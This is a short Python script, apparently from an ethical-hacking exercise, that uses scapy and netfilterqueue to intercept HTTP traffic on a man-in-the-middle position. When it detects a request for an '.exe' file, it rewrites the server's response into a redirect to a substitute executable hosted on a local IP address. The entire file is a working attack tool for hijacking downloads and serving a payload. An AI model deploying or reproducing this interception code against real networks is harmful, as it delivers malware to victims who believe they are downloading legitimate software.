#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue

ack_lst = []


def deloptions(replace_sPkt):
    del replace_sPkt[scapy.IP].len
    del replace_sPkt[scapy.IP].chksum
    del replace_sPkt[scapy.TCP].chksum
    return replace_sPkt


def replace_download(pkt):
    replace_sPkt = scapy.IP(pkt.get_payload())
    if replace_sPkt.haslayer(scapy.Raw):
        if replace_sPkt[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            if ".exe" in str(replace_sPkt[scapy.Raw].load):
                ack_lst.append(replace_sPkt[scapy.TCP].ack)
        elif replace_sPkt[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            if replace_sPkt[scapy.TCP].seq in ack_lst:
                ack_lst.remove(replace_sPkt[scapy.TCP].seq)
                print("[+] Replacing File")
                replace_url = "192.168.159.134/files/cdcd.exe"
                replace_sPkt[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + replace_url + "\n\n "

                modified_pkt = deloptions(replace_sPkt)
                pkt.set_payload(str(modified_pkt))

    pkt.accept()


def packet_show(pkt):
    print("[+] Printing Packets")
    scapy_pkt = scapy.IP(pkt.get_payload())
    print(scapy_pkt.show())


try:
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(0, replace_download)
    nfqueue.run()
except KeyboardInterrupt:
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")